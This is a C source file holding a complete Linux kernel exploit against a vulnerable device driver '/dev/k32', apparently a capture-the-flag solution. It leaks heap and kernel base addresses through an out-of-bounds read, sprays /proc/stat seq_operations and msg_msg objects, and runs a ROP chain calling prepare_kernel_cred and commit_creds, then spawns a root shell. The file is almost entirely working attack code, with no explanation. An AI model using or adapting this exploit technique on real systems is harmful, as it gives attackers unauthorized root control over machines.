#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/msg.h>
#include <errno.h>

#define READ 0xB10500C
#define WRITE 0xB10500D
#define CREATE 0xB10500A
#define DELETE 0xB10500B

typedef struct data
{
    char* str;
    uint8_t size;
    char pad[3];
    int idx;
} data;

int fd_device;

void open_device() {
    fd_device = open("/dev/k32", O_RDWR);
    if (fd_device < 0) {
        puts("Can not open device");
        exit(0);
    }
}


data req;
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t heap_base, kbase = 0;
uint64_t commit_creds = 0x0006de51, prepare_kernel_cred = 0x0006e045 \
, swapgs_restore_regs_and_return_to_usermode = 0x00600e10, pop_rdi = 0x12352e\
, xchg_rdi_rax = 0xef31f, pop_rsp=0x10be9a, stack_new;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

#define info_addr(name, addr) printf("%s: 0x%lx\n", name, addr)
#define calc_addr(name, addr, show) addr+=kbase; show==1 ? info_addr(name, addr) : 1


#define SEQS_SIZE 0x100
int seqs[SEQS_SIZE];

void k32_create(uint8_t size) {
    req.size = size;
    ioctl(fd_device, CREATE, &req);
}

void k32_read(int idx, uint8_t size, char* str) {
    req.idx = idx;
    req.size = size;
    req.str = str;
    ioctl(fd_device, READ, &req);
}

void k32_write(int idx, uint8_t size, char* str) {
    req.idx = idx;
    req.size = size;
    req.str = str;
    ioctl(fd_device, WRITE, &req);
}

void k32_delete(int idx) {
    req.idx = idx;
    ioctl(fd_device, DELETE, &req);
}

void spray_msgsnd() {
    uint64_t *payload = malloc(0x1000);
    int idx = 0;
    memset(payload, 0, 0x100);
    payload[idx++] = 1;
    payload[idx++] = pop_rdi;
    payload[idx++] = 0;
    payload[idx++] = prepare_kernel_cred;
    payload[idx++] = pop_rdi;
    payload[idx++] = heap_base;
    payload[idx++] = xchg_rdi_rax;
    payload[idx++] = commit_creds;
    payload[idx++] = swapgs_restore_regs_and_return_to_usermode+49;
    payload[idx++] = 0;
    payload[idx++] = 0;
    payload[idx++] = (uint64_t*)get_shell;
    payload[idx++] = user_cs;
    payload[idx++] = user_rflags;
    payload[idx++] = user_sp;
    payload[idx++] = user_ss;
    int mid[0x20];
    for (int s = 0; s < 0x20; s++)
    {
        mid[s] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (mid[s] == -1)
            error("msgget failed!");

        for (int j = 0; j < 4; j++)
        {
            if (msgsnd(mid[s], payload, 0x1000, 0))
                error("msgsnd failed!");
        }
    }
}

int main() {
    save_state();
    open_device();
    uint64_t* buf = malloc(0x30);

    k32_create(0x31);
    k32_read(0, 0x20, (char*)buf);

    heap_base = (uint64_t)(buf[2]/0x1000)*0x1000;
    printf("Heap: 0x%lx\n", buf[2]);
    printf("Heap base: 0x%lx\n", heap_base);

    for (int i = 0; i < 0x20; i++)
        k32_create(0x31);

    for (int i = 0; i < SEQS_SIZE; i++)
        seqs[i] = open("/proc/stat", O_RDONLY);
    
    int victim = -1;
    for (int i = 0; i < 0x20; i++) {
        k32_read(0, 0x30, (char*)buf);

        if ((buf[4] & 0xfff) == 0x471) {
            kbase = buf[4] - 0x1aa471;
            victim = i;
            break;
        }
    }
    
    if (kbase == 0) {
        puts("Could not spray");
        exit(0);
    }
    info_addr("kernel base", kbase);
    calc_addr("pop rdi", pop_rdi, 1);
    calc_addr("commit_creds", commit_creds, 1);
    calc_addr("prepare_kernel_cred", prepare_kernel_cred, 1);
    calc_addr("swapgs_restore_regs_and_return_to_usermode", swapgs_restore_regs_and_return_to_usermode, 0);
    calc_addr("xchg_rdi_rax", xchg_rdi_rax, 1);
    calc_addr("pop rsp", pop_rsp, 1);

    spray_msgsnd();
    stack_new = heap_base+0xba030;
    buf[4] = kbase+0x954c;
    info_addr("gadget1", buf[4]);
    buf[5] = kbase+0x0f091f;
    info_addr("gadget2", buf[5]);
    info_addr("spray payload", stack_new);

    k32_write(victim, 0x30, (char*)buf);
    for (int i = 0; i < SEQS_SIZE; i++) {
        __asm__(
        ".intel_syntax noprefix;"
        "mov r15, 0x11111111;"
        "mov r14, pop_rsp;"
        "mov r13, stack_new;"
        "mov r12, 0x22222222;"
        "mov rbx, 0x33333333;"
        ".att_syntax;");

        read(seqs[i], buf, 0x30);
    }
}